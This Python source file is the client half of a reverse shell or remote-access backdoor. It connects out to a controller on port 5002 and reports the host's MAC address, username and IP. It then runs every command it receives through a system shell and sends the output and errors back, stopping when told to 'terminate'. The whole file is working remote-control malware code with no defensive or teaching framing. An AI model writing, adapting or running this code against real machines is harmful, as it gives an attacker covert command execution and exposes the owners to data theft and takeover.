# Client

import socket # for building TCP conneciton
import subprocess # to start the shell in the system
import json
import sys
import getpass

from uuid import getnode as get_mac

def wrap_message(msg, sender):
    return {"type":"cmd", "response":msg, "sender": sender}

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0', 5002))

    if len(sys.argv) > 1:
        mac = sys.argv[1]
    else:
        mac = get_mac()
        mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        
    ip, port = s.getsockname()
    s.send(json.dumps({"type":"new",
                       "mac": mac,
                       "username": getpass.getuser(),
                       "ip": ip + ":" + str(port)}).encode("utf-8"))
    while True: # keep receiving comments
        command = s.recv(1024).decode('utf-8')
        command = json.loads(command)['cmd']

        if 'terminate' in command:
            s.close() # close the socket
            break

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = CMD.stdout.read().decode('utf-8')
            if output != "":
                s.send(json.dumps(wrap_message(output, mac)).encode('utf-8')) # send the result
            
            error = CMD.stderr.read().decode('utf-8')
            if error != "":
                s.send(json.dumps(wrap_message(error, mac)).encode('utf-8')) # incase of error, we will send back the error


def main():
    connect()

main()
    